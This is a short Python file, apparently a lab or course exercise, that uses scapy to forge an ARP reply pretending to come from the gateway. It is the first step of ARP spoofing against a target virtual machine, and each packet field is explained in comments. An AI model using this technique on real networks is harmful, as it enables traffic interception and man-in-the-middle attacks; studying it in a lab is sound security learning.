import scapy.all as scapy

# creating a ARP package
# the op=2 options means that we are creating a response instead of a request (request would be op=1)
# pdst is the destination ip, we are setting it to the ip of our Windows VM (the target)
# hwdst is the destination mac address, we are setting it to the mac of our Windows VM (the target)
# psrc is the source ip field, we gonna set this to the router/gateway ip (remember, we are forging this packet), so the target will think this packet response is comming from the router
packet = scapy.ARP(op=2, pdst="172.16.239.139", hwdst="00:0c:29:7a:48:f6", psrc="172.16.239.2")